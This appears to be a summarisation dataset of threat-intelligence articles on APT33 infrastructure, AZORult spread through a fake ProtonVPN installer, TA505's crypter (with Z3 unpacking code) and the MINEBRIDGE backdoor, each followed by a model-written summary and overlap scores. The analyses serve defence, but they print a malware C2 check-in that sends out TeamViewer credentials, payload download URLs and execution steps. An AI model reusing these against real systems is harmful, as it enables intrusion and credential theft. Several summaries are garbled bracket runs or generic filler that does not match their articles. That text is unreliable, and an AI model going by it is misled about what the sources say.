e144db21cc5f8f57aa748c0a8e4008fc34f8dd831eb2442eb35961e4cdf41f22Targeted OrganizationsSelection of hashes correlated with suspected APT33 malicious domains. Recorded Future clients will be able to access the full list of domains in the Certified Data Set via API download.Using data from Recorded Future Domain Analysis and combining it with data derived from Recorded Future Network Traffic Analysis, Insikt Group researchers were able to identify a small selection of likely targeted organizations impacted by suspected APT33 activity.Targeted Organization Sector(s) Country of Operation Date of Observed Activity Suspected APT33 C2 IP Organization 1 Engineering and Construction, Water and Electricity, Technology, Retail, Finance Saudi Arabia, UAE, Egypt, Turkey, Croatia May 2 - June 3, 2019 134.3.20[.]151 Organization 2 Mass Media India May 4 - June 1, 2019 134.3.20[.]151 Organization 3 Diplomatic Burkina Faso May 2, 2019 134.3.20[.]151 Organizations 4 and 5 Healthcare Saudi Arabia May 2 - May 8, 2019 41.103.3[.]7, 46.249.47[.]193 Organization 6 Industrial Saudi Arabia May 25 - June 3, 2019 62.113.171[.]186OutlookFollowing the exposure of a wide range of their infrastructure and operations by Symantec earlier this year, we discovered that APT33, or closely aligned actors, reacted by either parking or reassigning some of their domain infrastructure. The fact that this activity was executed just a day or so after the report went live suggests the Iranian threat actors are acutely aware of the media coverage of their activities and are resourceful enough to be able to react in a quick manner.Since late March, suspected APT33 threat actors have continued to use a large swath of operational infrastructure, well in excess of 1,200 domains, with many observed communicating with 19 different commodity RAT implants. An interesting development appears to be their increased preference for njRAT, with over half of the observed suspected APT33 infrastructure being linked to njRAT deployment.While we haven't observed a widespread targeting of commercial entities or regional adversaries like in previously documented APT33 operations, the handful of targeted organizations that we did observe were mainly located in Saudi Arabia across a range of industries, indicating ongoing targeting aligned with geopolitical aims. We assess that the large amount of infrastructure uncovered in our research is likely indicative of wider ongoing operational activity, or the laying of groundwork for future cyberespionage operations. We recommend organizations take measures to monitor their networks for evidence of suspected APT33 activity by following the guidance in the ""Network Defense Recommendations"" section below.Finally, our recommendation to Recorded Future clients is to use our upcoming ""Weaponized Domains"" Certified Data Set, which has been derived from predictive analytics that assist in the identification of malicious APT infrastructure. This is meant to empower your security teams to hunt, detect, and block high-fidelity malicious indicators at scale.Network Defense RecommendationsRecorded Future recommends that organizations conduct the following measures in order to detect and mitigate suspected APT33 activity:Configure your intrusion detection systems (IDS), intrusion prevention systems (IPS), or any network defense mechanisms in place to alert on -- and upon review, consider blocking illicit connection attempts from -- the external IP addresses and domains listed in Appendix A.As detailed in our previous blog on APT33 available to our clients only, Dynamic DNS (DDNS) continues to be a relevant operational choke point for security control implementation. All TCP/UDP network traffic involving DDNS subdomains should be blocked and logged (using DNS RPZ or similar).Conduct regular Yara scans across your enterprise for the new rules listed in Appendix B.To view a full list of the associated indicators of compromise, download the appendix.";. . . , the report. . . . . . . . , 201. with the report with the report with the IT with IT, with: ay. ay. . uth. APT33 Cleaning Up?Starting with the APT33 indicators documented by Symantec, Insikt Group profiled the domain and hosting infrastructure used by the group using the Farsight Security extension within the Recorded Future platform, revealing updated IP resolutions for some of the domains.Domain Original IP Resolution (Per Symantec Report) Updated IP Resolutions backupnet.ddns[. ]net 25.187.21[. ]71, 91.230.121[. ]143 95.183.54[. ]119 hyperservice.ddns[. ]net 8.26.21[. ]119 95.183.54[. ]119 microsoftupdated[. ]com 5.187.21[. ]70 52.45.178[. ]122 mynetwork[. ]cf 192.119.15[. ]41, 195.20.52[. ]172 195.20.52[. ]172 mypsh.ddns[. ]net 162.250.145[. ]204, 162.250.145[. ]234, 192.119.15[. ]35, 192.119.15[. ]37, 64.251.19[. ]214, 64.251.19[. ]231, 64.251.19[ The ITSecurity report indicates that there is a high risk of security breaches due to the lack of adequate security measures. The report recommends that security measures should be implemented to reduce the risk of security breaches. Recorded Future Intelligence Card(tm) for microsoftupdated[. ]com, enriched using the Farsight Security extension. The Recorded Future Intelligence Card(tm) for windowsx.sytes[. ]net, showing the relationship between the domain and the Nanocore RAT malware. ### Output:;en;{'r': 0.09009679821295608, 'p': 0.8897058823529411, 'f': 0.16362406864781268};{'r': 0.0493385770468359, 'p': 0.745945945945946, 'f': 0.09255533082815023};{'r': 0.09009679821295608, 'p': 0.8897058823529411, 'f': 0.16362406864781268}
https://securelist.com/azorult-spreads-as-a-fake-protonvpn-installer/96261/;AZORult spreads as a fake ProtonVPN installer;"AZORult has its history. However, a few days ago, we discovered what appears to be one of its most unusual campaigns: abusing the ProtonVPN service and dropping malware via fake ProtonVPN installers for Windows.The campaign started at the end of November 2019 when the threat actor behind it registered a new domain under the name protonvpn[.]store. The Registrar used for this campaign is from Russia.We have found that at least one of the infection vectors is through affiliation banners networks (Malvertising).When the victim visits a counterfeit website and downloads a fake ProtonVPN installer for Windows, they receive a copy of the Azorult botnet implant.The Website is an HTTrack copy of the original ProtonVPN website as shown below.Once the victim runs the implant, it collects the infected machine's environment information and reports it to the C2, located on the same accounts[.]protonvpn[.]store server.{ ""config: "": [ ""MachineID :"", ""EXE_PATH :"", ""Windows :"", ""Computer(Username) :"", ""Screen:"", ""Layouts:"", ""LocalTime:"", ""Zone:"", ""[Soft]"", ""Host: User-Agent: Accept: , charset=Content-Type: HTTP/1.0POST text/*utf-8text/htmlHTTP/Proxy-AuthenticateAcceptContent-TypeContent-Lengthrealmhttp::Connection::connect: using proxy %1%http::Connection::connect: testing %1% for proxy routing"" ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 { ""config: "" : [ ""MachineID :"" , ""EXE_PATH :"" , ""Windows :"" , ""Computer(Username) :"" , ""Screen:"" , ""Layouts:"" , ""LocalTime:"" , ""Zone:"" , ""[Soft]"" , ""Host: User-Agent: Accept: , charset=Content-Type: HTTP/1.0POST text/*utf-8text/htmlHTTP/Proxy-AuthenticateAcceptContent-TypeContent-Lengthrealmhttp::Connection::connect: using proxy %1%http::Connection::connect: testing %1% for proxy routing"" ] }In their greed, the threat actors have designed the malware to steal cryptocurrency from locally available wallets (Electrum, Bitcoin, Etherium, etc.), FTP logins and passwords from FileZilla, email credentials, information from locally installed browsers (including cookies), credentials for WinSCP, Pidgin messenger and others.We have been able to identify a few samples associated with the campaign:Filename MD5 hash ProtonVPN_win_v1.10.0.exe cc2477cf4d596a88b349257cba3ef356 ProtonVPN_win_v1.11.0.exe 573ff02981a5c70ae6b2594b45aa7caa ProtonVPN_win_v1.11.0.exe c961a3e3bd646ed0732e867310333978 ProtonVPN_win_v1.11.0.exe 2a98e06c3310309c58fb149a8dc7392c ProtonVPN_win_v1.11.0.exe f21c21c2fceac5118ebf088653275b4f ProtonVPN_win_v1.11.0.exe 0ae37532a7bbce03e7686eee49441c41 Unknown 974b6559a6b45067b465050e5002214bKaspersky products detect this threat as HEUR:Trojan-PSW.Win32.Azorult.gen";The ITSecurity report summarizes the abuse of the ProtonVPN service and dropping malware via fake ProtonVPN installers for Windows. The campaign started at the end of November 2019 when the threat actor behind it registered a new domain under the name protonvpn[.]store. The Registrar used for this campaign is from Russia. We have found that at least one of the infection vectors is through affiliation banners networks (Malvertising). When the victim visits a counterfeit website and downloads a fake ProtonVPN installer for Windows, they receive a copy of the Azorult botnet implant. The Website is an HTTrack copy of the original ProtonVPN website as shown below. Once the victim runs the implant, it collects the infected machine's environment information and reports it to the C2, located on the same accounts[.]protonvpn[.]store server.;en;{'r': 0.41784037558685444, 'p': 0.956989247311828, 'f': 0.5816993421741637};{'r': 0.4074074074074074, 'p': 0.952755905511811, 'f': 0.5707547127849102};{'r': 0.41784037558685444, 'p': 0.956989247311828, 'f': 0.5816993421741637}
https://www.sentinelone.com/labs/breaking-ta505s-crypter-with-an-smt-solver/;Breaking TA505’s Crypter with an SMT Solver;"Using a satisfiability modulo theories (SMT)[8] solver to break the latest variant of the crypter being used on Get2.Executive SummaryTA505 has been leveraging the Get2 loader using the same crypter since at least September 2019.Crypter overlap found leveraged by actors involved in Clop/CryptoMix ransomware.Crypter overlap found leveraged by actors involved with MINEBRIDGE reported by FireEye to also be used by TA505.Crypter overlap work shows more links of TA505 leveraging Clop/CryptoMix and MINEBRIDGE.BackgroundTA505 [3] has been pushing their Get2 loader DLLs for a long time now using the same tactic [4], during this time the crypter has remained the same with a few modifications every few months. This crypter is actually a prime candidate for using SMT [1] to solve it and the latest iteration of the crypter gave me enough of a reason to write up a new unpacker utilizing SMT.Research InsightThe crypter on the DLL has remained mostly static for the past 6 months with a few tweaks here and there. For example, the XOR key for decoding the unpacked binary has moved around a bit, the latest version looking at the 32-bit binary had the key referenced as an offset instead of having it placed in relation to the binary blob to be decoded.The decoding is actually done by an encoded blob of bytecode which is decoded in a similar manner to the crypted binary.The next layer that is decoded has remained pretty static over the months, it will reconstruct the binary data, run the same decoding routine and finally APLib decompress the resulting blob giving us our unpacked Get2 loader.The decoding is going to be:f(x) = rol(x^I"", 4) + 2004318072We also know the output for the first iteration being a compressed binary will be 'M8Zx90' so we can construct our problem in Z3[2] and let it solve what the XOR key should be.def solve_ta505crypter(input, output): xorkey = BitVec('xor1', 32) s = Solver() s.add(rol(BitVecVal(struct.unpack_from('<I',input)[0], 32) ^ xorkey, 4) + 2004318072 == BitVecVal(struct.unpack_from('<I',output)[0], 32)) return(s)After solving for the XOR key we just decode the data and write out the decompressed file.key = None for poss_decode in possible_decodes: s = solve_ta505crypter(t, poss_decode) if s.check() == sat: m = s.model() for d in m.decls(): if d.name() == 'xor1': key = m[d].as_long() if key: out = """" for i in range(len(t)/4): temp = struct.unpack_from('<I', t[i*4:])[0] temp ^= key temp = rol(temp, 4) temp += 2004318072 out += struct.pack('<I', temp & 0xffffffff) open(sys.argv[1]+'_decodedObject', 'wb').write(out) if out[:3] == 'M8Z': print(""Decompressing"") out2 = aplib.decompress(out).do() open(sys.argv[1]+'_decompressed', 'wb').write(out2[0])Now with a decoder, we can run it on the past few campaigns to harvest the IOCs. For example:<..snip..> f3196cb8288afe0c9e64778d9d82e4ad482153b916547809861f6d95677646fa Decompressing f66e03c26afac344b4e38345b26ce104f7131ed81e4f4961d43bd35df83493a5 Decompressing f769549f2220a54ba738f0ff29c8d6917b9320fb6bc1445a821a990979f49c58 Decompressing f775f6b32c8d54e44733d5dda34db81bd62e85f4e1df48500b6160403e482756 Decompressing <..snip..>PivotAfter breaking apart a crypter that appears to only be used by a specific actor group we can pivot on that crypter to see what else they might be using, such as this FlawedAmmy Loader that was mentioned on Twitter[5].4064ff7e06367b2431d371ddd1e97f659ec7f3c050229350725c91d6fffff835And another FlawedAmmy loader sample:ad320839e01df160c5feb0e89131521719a65ab11c952f33e03d802ecee3f51fAlso an 'av_block' sample: 1c983566c27a154f319bf6f1681b1de91930f3b7c019560a0fbc52ead861bf90This sample when unpacked shows to be designed to block protection services, after deobfuscating the strings which are obfuscated using a partial base64 and then eexec decoding.Deobfuscated strings involve a huge list of security products. This sample appears possibly related to Clop or Cryptomix ransomware[6]. Some of the other strings in the binary we can also decode to get the process and files names related to some common server processes such as SQL, ElasticSearch and Apache.Another interesting sample found by pivoting on this packer is a custom loader designed to load TeamViewer which FireEye calls MINEBRIDGE[7] and list that is also used as a backdoor.244a272d25328c05361c106d74a126b57a779585b6c7f622f79019bb6838e982This sample after unpacking has a custom UPX layer on it as well.After unpacking the sample fully we have a number of interesting strings.Domains:conversia91.top fatoftheland.top creatorz123.top 123faster.top compilator333.topCommandsdrun_command drun_URL rundll_command rundll_URL update_command update_URL restart_command terminate_command kill_command poweroff_command reboot_command setinterval_command setinterval_timeC2 Relateduuid=%s&id=%s&pass=%s&username=%s&pcname=%s&osver=%s&timeout=%d ~f83g7bfiunwjsd1/g4t3_indata.php uuid=%s&drun_status=1 uuid=%s&drun_status=2 uuid=%s&rundll_status=1 uuid=%s&rundll_status=2 uuid=%s&rundll_status=3 uuid=%s&update_status=1 uuid=%s&update_status=2 uuid=%s&restart_status=1 uuid=%s&terminate_status=1 uuid=%s&kill_status=1 uuid=%s&poweroff_status=1 uuid=%s&reboot_status=1 uuid=%s&setinterval_status=1Also some hardcoded strings that seem interesting:TeamViewer ~45feyf923h.bin https://conversia91.top/~files_tv/~all_files_m.bin Windows Defender COM1_ TeamViewer server TV_Marker CInfoWindow TVWidget WidegetAudioVoipPage TVScrollWin Button SoftwareTeamViewer TeamViewer DynGateInstanceMutex _GAZGOLDER_VASYA .log .txt .tmpThe loader performs a checkin to the C2 with a hardcoded User-Agent as well.POST /~bv0j3irngskdn13/g4t3_indata.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (iPhone, CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1 Host: compilator333.top Content-Length: 126 Cache-Control: no-cache uuid=9939DCDD-0E9E-754F-30950A0B&id=.1221882482&pass=p6dj76&username=ZWYJukQ&pcname=qIXONnRuFs&osver=Windows 7 SP 1&timeout=60Downloading the all_files_m.bin gives us a ZIP compressed file full of TeamViewer software:Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2018-09-17 05:17:10 ....A 27268760 11389396 TeamViewer.exe 2017-01-05 08:10:34 ....A 130 90 TeamViewer.ini 2018-09-17 05:17:10 ....A 7491824 2879243 TeamViewer_Desktop.exe 2018-09-17 05:17:28 ....A 728816 150689 TeamViewer_Resource_en.dll 2018-09-17 05:17:12 ....A 1445104 1210362 TeamViewer_StaticRes.dll ------------------- ----- ------------ ------------ ------------------------Indicators of CompromiseSamplescf17190546eb876307bde25810973cdaa1bc739e3d85bcc977c858c305130eb4 7420aafbceebd779fce23016e782e2223ed1e9f580e338bbd388beafe66dd10bURLs78d05d8a2c0604e115850977304b6a0b347492c9 hxxps://general-lcfd.com/ir1ask e87e9041ea10ee08009c1ca1eaf756c8e053eb45 hxxps://home-storages.com/possdeip 4d62018b98c0ea627c69c0d0463dd35da67a82a3 hxxps://integer-ms-home.com/ir2ask 77d9df72ca8605652b6d804f3944ebc9b2451eac hxxps://microsoft-live-us.com/archage 74d8922f038219a270f75162d8b81d4b48870de7 hxxps://ms-break.com/rrrdd1 f5e3db52f0de6d5de8c2bf12d47e45a19f2f112c hxxps://ms-home-store.com/gggiko1 fe8c75d8c05101620d1eb8169dcfc40ae9d2932e hxxps://ms-rdt.com/zoikkal ec3751f35cffae7a754fa68087d2c252d42a8815 hxxps://ms-upgrades.com/dddkop2 f16d9e525e7ba66cff121e6aa1309d444676ec99 hxxps://online-office365.com/8800 1802ad465d71e054ef0dff23ed608fe4813536af hxxps://onms-home.com/4444 7fbfaa047b28095b6a333cae56893583ed714bf0 hxxps://upgrade-ms-home.com/55555 47324f2342dc11eb124f5d44461ae2f8a408a8e5 hxxps://windows-avs-update.com/wood c4d2a6ba297317ff6f070797cc119fd5e70b749e hxxps://windows-en-us-update.com/2024 5cb0d7ca31f58ec6c2f84d681759d311bc8ecd9e hxxps://windows-se-update.com/2021YARArule dll_packer_science_not_feelz { meta: author=""Jason Reaves"" strings: $a1 = {c7 45 fc 00 00 00 00 8b 45 08 33 45 0c 89 45 08 c1 45 08 04 8b 4d 08 81 c1 78 77 77 77} condition: all of them } rule dll_packer_science_not_feelz_2 { meta: sample=""98cbaf55376e928b0c78fce3867d95b9ef4b45c1d91f103f00dad403dd524189"" thanks=""Fowler"" author=""Jason Reaves"" strings: $a1 = {c7 45 fc 00 00 00 00 8b 45 08 33 45 0c 89 45 08 [0-20] c1 45 08 04 [0-14] 8b 4? 08 [1-2] 78 77 77 77} condition: all of them }References1: https://vixra.org/abs/2002.01832: https://github.com/Z3Prover/z33: https://attack.mitre.org/groups/G0092/4: https://blog.nviso.eu/2019/09/18/malicious-spreadsheet-dropping-a-dll/5: https://twitter.com/VK_Intel/status/11592772858344079366: https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-08-03-cryptomix-clop-av_blockk-component.vk.notes.raw7: https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html8: https://en.wikipedia.org/wiki/Satisfiability_modulo_theories";<..snip..> [: [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [: [: [: [ [ [ [ [: [: [: [: [: [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [, [, [, [ [ [ [ [ [ [ [ [ [ [ [ ( [ ( [ ( [ ( [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [. [ by in by in by in [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ a a [ [ [ [ . . a a a . a . . . . . . . .. [. [ [ [ [ The ITSecurity report provides an overview of the current state of ITSecurity. It discusses the vulnerabilities of ITsystems, the risks of cyberattacks, and the measures that can be taken to mitigate these risks. The report also discusses the current trends in ITSecurity, such as the use of artificial intelligence and machine learning to detect malicious activities.;en;{'r': 0.031413612565445025, 'p': 0.3673469387755102, 'f': 0.05787781205338038};{'r': 0.005611672278338945, 'p': 0.0641025641025641, 'f': 0.010319915960343613};{'r': 0.031413612565445025, 'p': 0.3673469387755102, 'f': 0.05787781205338038}
https://www.mandiant.com/resources/blog/stomp-2-dis-brilliance-in-the-visual-basics;STOMP 2 DIS: Brilliance in the (Visual) Basics;"Throughout January 2020, FireEye has continued to observe multiple targeted phishing campaigns designed to download and deploy a backdoor we track as MINEBRIDGE. The campaigns primarily targeted financial services organizations in the United States, though targeting is likely more widespread than those we've initially observed in our FireEye product telemetry. At least one campaign targeted South Korean organizations, including a marketing agency.In these campaigns, the phishing documents appeared to be carefully crafted and leveraged some publicly-documented -- but in our experience uncommon and misunderstood -- TTPs, likely in an effort to decrease detection of the malicious documents' macros. The actor also used a self-hosted email marketing solution across multiple campaigns. Notably, the payload delivered in these campaigns leveraged a packer previously affiliated with a commonly-tracked threat actor, an overlap that we will explore later.This blog post will review the theme of these campaigns and their targets, the adversary's unique tradecraft, the MINEBRIDGE C++ backdoor, some potential attribution overlaps, and importantly -- the threat actor's love of rap music.Targeting and Lure DetailWhile we first identified MINEBRIDGE samples in December, we observed our first phishing campaigns relating to this activity in early January 2020. Email addresses used to send phishing messages were associated with domains that appear to have been registered specifically for this purpose within a few weeks of the activity -- and were thematically consistent with the content of the phishing messages.Additionally, the actor(s) responsible are likely using a self-hosted email marketing solution called Acelle. Acelle adds extended email headers to messages sent via the platform in the format of X-Acelle-<variable>. The messages observed across campaigns using these TTPs have included a ""Customer-Id"" value matching ""X-Acelle-Customer-Id: 5df38b8fd5b58"". While that field remained consistent across all observed campaigns, individual campaigns also shared overlapping ""X-Acelle-Sending-Server_Id"" and ""X-Acelle-Campaign-Id"" values. All of the messages also included a ""List-Unsubscribe"" header offering a link hosted at 45.153.184.84 suggesting that it is the server hosting the Acelle instance used across these campaigns. The sample table for one campaign below illustrates this data:Timestamp Sender Subject x-acelle-subscriber-id x-acelle-sending-server-id x-acelle-customer-id x-acelle-campaign-id 1/7/20 16:15 info@rogervecpa.com tax return file 25474792e6f8c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 15:59 info@rogervecpa.com tax return file 22e183805a051 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 info@rogervecpa.com tax return file 657e1a485ed77 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 16:05 info@rogervecpa.com tax return file ddbbffbcb5c6c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4The URLs requested by the malicious documents and serving the final MINEBRIDGE payloads delivered in each of these campaigns provide additional overlap across campaigns. In all observed cases, the domains used the same bullet-proof hosting service. The URI used to download the final payload was ""/team/invest.php"" or, in one case, ""/team/rumba.php"". Perhaps the most fun overlap, however, was discovered when trying to identify additional artifacts of interest hosted at similar locations. In most cases a GET request to the parent directory of ""/team/"" on each of the identified domains served up the lyrics to rap group Onyx's ""Bang 2 Dis"" masterpiece. We will refrain from sharing the specific verse hosted due to explicit content.One of the more notable characteristics of this activity was the consistency in themes used for domain registration, lure content, similarities in malicious document macro content, and targeting. Since first seeing these emails, we've identified at least 3 distinct campaigns.Campaign 1: January 7, 2020 - Tax ThemeEmails associated with this campaign used the CPA themed domain rogervecpa.com registered in late November and the subject line ""Tax Return File"" with IRS related text in the message body.The attached payload was crafted to look like an H&R Block related tax form.Observed targeting included the financial sector exclusively.Campaign 2: January 8, 2020 - Marketing ThemeEmails associated with this campaign used the same CPA themed domain rogervecpa.com along with pt-cpaaccountant.com, also registered late November.The subject line and message body offered a marketing partnership opportunity to the victim.The attached payload used a generic theme enticing users to enable macro content.Observed targeting focused on a South Korean marketing agency.Campaign 3: January 28, 2020 - Recruiting ThemeEmails associated with this campaign were sent from several different email addresses, though all used the recruiting-themed domain agent4career.com which was registered on January 20, 2020.The subject line and message body referenced an employment candidate with experience in the financial sector.The attached payload masqueraded as the resume of the same financial services candidate referenced in the phishing email.Observed targeting included the financial sector exclusively.Quit Stepping All Over My MacrosThe phishing documents themselves leverage numerous interesting TTPs including hiding macros from the Office GUI, and VBA stomping.VBA stomping is a colloquial term applied to the manipulation of Office documents where the source code of a macro is made to mismatch the pseudo-code (hereto referred to as ""p-code"") of the document. In order to avoid duplicating research and wasting the reader's time, we will instead reference the impressive work of our predecessors and peers in the industry. As an introduction to the concept, we first recommend reading the tool release blog post for EvilClippy from Outflank. The security team at Walmart has also published incredible research on the methodology. Vesselin Bontchev provides a useful open source utility for dumping the p-code from an Office document in pcodedmp. This tool can be leveraged to inspect the p-code of a document separate from its VBA source. It was adopted by the wider open source analysis toolkit oletools in order to detect the presence of stomping via comparison of p-code mnemonics vs keyword extraction in VBA source.That is a whole lot of quality reading for those interested. For the sake of brevity, the most important result of VBA stomping as relevant to this blog post is the following:Static analysis tools focusing on VBA macro source extraction may be fooled into a benign assessment of a document bearing malicious p-code.When VBA source is removed, and a document is opened in a version of Office for which the p-code was not compiled to execute, a macro will not execute correctly, resulting in potential failed dynamic analysis.When a document is opened under a version of Office that uses a VBA version that does not match the version of Office used to create the document, VBA source code is recompiled back into p-code.When a document is opened in Office and the GUI is used to view the macro, the embedded p-code is decompiled to be viewed.The final two points identify some interesting complications in regard to leveraging this methodology more broadly. Versioning complexities arise that toolkits like EvilClippy leverage Office version enumeration features to address. An actor's VBA stomped document containing benign VBA source but evil p-code must know the version of Office to build the p-code for, or their sample will not detonate properly. Additionally, if an actor sends a stomped document, and a user or researcher opens the macro in the Office editor, they will see malicious code.Our actor addressed the latter point of this complication by leveraging what we assess to be another feature of the EvilClippy utility, wherein viewing the macro source is made inaccessible to a user within Office by modifying the PROJECT stream of the document. Let's highlight this below using a publicly available sample we attribute to our actors (SHA256: 18698c5a6ff96d21e7ca634a608f01a414ef6fbbd7c1b3bf0f2085c85374516e):Document PROJECT stream:ID=""{33C06E73-23C4-4174-9F9A-BA0E40E57E3F}""Document=ThisDocument/&H00000000Name=""Project""HelpContextID=""0""VersionCompatible32=""393222000""CMG=""A3A1799F59A359A359A359A3""DPB=""87855DBBA57B887C887C88""GC=""6B69B1A794A894A86B""[Host Extender Info]&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A},VBE,&H00000000[Workspace]ThisDocument=0, 0, 0, 0, CModule1=26, 26, 388, 131, ZThe above PROJECT stream has been modified. Within the PROJECT stream workspace, a module is referenced. However, there is no module defined. We would expect the unmodified PROJECT stream of this document prior to utilization of a tool to modify it to be as follows:ID=""{33C06E73-23C4-4174-9F9A-BA0E40E57E3F}""Document=ThisDocument/&H00000000Module=""Module1""Name=""Project""HelpContextID=""0""VersionCompatible32=""393222000""CMG=""A3A1799F59A359A359A359A3""DPB=""87855DBBA57B887C887C88""GC=""6B69B1A794A894A86B""[Host Extender Info]&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A},VBE,&H00000000[Workspace]ThisDocument=0, 0, 0, 0, CModule1=26, 26, 388, 131, ZIt is interesting to note that we initially identified this actor only performing this manipulation on their malicious documents--avoiding any versioning complexities--without actually stomping the p-code to mismatch the VBA source. This seems like an odd decision and is possibly indicative of an actor assessing what ""works"" for their campaigns. The above malicious document is an example of them leveraging both methodologies, as highlighted by this screenshot from the awesome publicly available web service IRIS-H Digital Forensics:We can see that the documents VBA source is a blank Sub procedure definition. A quick glance at the p-code identifies both network- based indicators and host- based indicators we can use to determine what this sample would do when executed on the proper Office version. When we attempt to open the macro in the GUI editor, Office gets angry:For analysts looking to identify this methodology holistically, we recommend the following considerations:The GUI hiding functionality results in an altered project stream wherein a module exists, but there is no module, class, or baseclass defined in the stream. This is a potential static detection.While the macro source is no longer present, there are still static strings present in Module1 in this sample which may indicate Windows APIs leveraged. This is a potential static detection.Utilities like the previously mentioned oletools can do all of this detection for you. If you identify false negatives, false positives, or bugs, the open source project maintainers respond to them regularly like the superheroes that they are:The above methodology creates questions regarding potential efficiency problems for scaling any sizable campaign using it. While tools like EvilClippy provide the means to create difficult to detect malicious documents that can potentially sneak past some dynamic and static detections, their payloads have the additional burden of needing to fingerprint targets to enable successful execution. While actors with sufficient resources and creativity can no doubt account for these requirements, it is relevant to note that detections for these methodologies will likely yield more targeted activity. In fact, tertiary review of samples employing these techniques identified unrelated activity delivering both Cobalt Strike BEACON and POSHC2 payloads.We recently expanded our internal FireEye threat behavior tree to accommodate these techniques. At the time of publication, the authors were unable to directly map the methods - PROJECT stream manipulation and VBA stomping - to existing techniques in the MITRE ATT&CK Matrix(tm) for Enterprise. However, our team submitted these as contributions to the ATT&CK knowledge base prior to publication and will make additional data available for ATT&CK Sightings.Crossing The Bridge of Khazad-dum: The MINEBRIDGE Infection ChainSuccessful detonation of the previously detailed malicious document results in creation of ""uCWOncHvBb.dll"" via a call to URLDownloadToFileA to the URL hxxps://marendoger[.]com/team/rumba.php. The returned MINEDOOR packed MINEBRIDGE sample is saved in the executing users AppData directory (Eg: C:\Users\username\AppData\Roaming\uCWOncHvBb.dll), and then subsequent execution of the DllRegisterServer export via invocation of ""regsvr32.exe /s %AppData%\uCWOncHvBb.dll"" occurs:This will result in a ZIP file being retrieved from the URL hxxps://creatorz123[.]top/~files_tv/~all_files_m.bin using the Windows API URLDownloadToFileW. The ZIP file is written to %TEMP%, unzipped to the newly created directory %AppData%\Windows Media Player, and then deleted:The ZIP file contains legitimate files required to execute a copy of TeamViewer, listed in the file creation area of the IOC section of this post. When a file named TeamViewer.exe is identified while unzipping, it is renamed to wpvnetwks.exe:After completing these tasks, uCWOncHvBb.dll moves itself to %AppData%\Windows Media Player\msi.dll. The phishing macro then closes the handle to msi.dll, and calls CreateProcessA on wpvnetwks.exe, which results in the renamed TeamViewer instance side-loading the malicious msi.dll located alongside it. The malware ensures its persistence through reboot by creating a link file at %CISDL_STARTUP%\Windows WMI.lnk, which points to %AppData%\Windows Media Player\wpnetwks.exe, resulting in its launch at user logon.The end result is a legitimate, though outdated (version 11, compiled on September 17, 2018, at 10:30:12 UTC), TeamViewer instance hijacked by a malicious sideloaded DLL (MINEBRIDGE).MINEBRIDGE is a 32-bit C++ backdoor designed to be loaded by an older, unpatched instance of the legitimate remote desktop software TeamViewer by DLL load-order hijacking. The backdoor hooks Windows APIs to prevent the victim from seeing the TeamViewer application. By default, MINEBRIDGE conducts command and control (C2) communication via HTTPS POST requests to hard-coded C2 domains. The POST requests contain a GUID derived from the system's volume serial number, a TeamViewer unique id and password, username, computer name, operating system version, and beacon interval. MINEBRIDGE can also communicate with a C2 server by sending TeamViewer chat messages using a custom window procedure hook. Collectively, the two C2 methods support commands for downloading and executing payloads, downloading arbitrary files, self-deletion and updating, process listing, shutting down and rebooting the system, executing arbitrary shell commands, process elevation, turning on/off TeamViewer's microphone, and gathering system UAC information.MINEBRIDGE's default method of communication is sending HTTPS POST requests over TCP port 443. This method of communication is always active, however, the beacon-interval time may be changed via a command. Before sending any C2 beacons, the sample waits to collect the TeamViewer generated unique id (<tv_id>) and password (<tv_pass>) via SetWindowsTextW hooks.This specific sample continuously sends an HTTP POST request over TCP port 443 with the URI ~f83g7bfiunwjsd1/g4t3_indata.php to each host listed below until a response is received.123faster[.]topconversia91[.]topfatoftheland[.]topcreatorz123[.]topcompilator333[.]topThe POST body contains the formatted string uuid=<guid>&id=<tv_id>&pass=<tv_pass>&username=<user_name>&pcname=<comp_name>&osver=<os_version>&timeout=<beacon_interval> where <guid> is a GUID derived from the system's volume serial number and formatted using the format string %06lX-%04lX-%04lX-%06lX. Additionally, the request uses the hard-coded HTTP User-Agent string ""Mozilla/5.0 (iPhone, CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1""After a response is received, it's processed for commands. A single response may contain multiple commands. For each command executed, the sample sends an HTTPS POST request over TCP port 443 indicating success or failure. The sample responds to the commands below.Command Description drun Download and execute an executable from a URL provided in the command. File saved to %TEMP%\<32_rand_chars>.exe. rundll_command Download a custom XOR-encoded and LZNT1 compressed DLL from a URL provided in the command and save to %TEMP%\<32_rand_chars>. Decode, decompress, and load the DLL in memory and call its entrypoint. update_command Move sample file to <sample_name>.old and download a new version of itself to <sample_name> where <sample_name> is 